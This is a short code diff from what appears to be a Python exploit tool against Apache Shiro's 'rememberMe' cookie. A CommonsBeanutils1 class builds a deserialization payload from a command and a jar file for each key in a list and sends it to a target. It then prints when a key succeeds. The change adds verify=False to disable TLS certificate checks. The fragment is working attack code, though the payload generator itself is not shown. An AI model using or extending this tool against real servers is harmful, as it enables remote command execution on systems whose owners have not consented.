@@ -37,7 +37,7 @@ class CommonsBeanutils1(object):
         try:
             for key in self.keyList:
                 payload = self.newGenerator(command, JAR_FILE,key,mode)  # 生成payload
-                r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=20)  # 发送验证请求1
+                r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=20,verify=False)  # 发送验证请求1
                 # print("payload1已完成,字段rememberMe:看需要自己到源代码print "+payload.decode())
                 if (r.status_code == 200):
                     print("[+]   "+mode+"模块   key:"+key+" 已成功发送！")
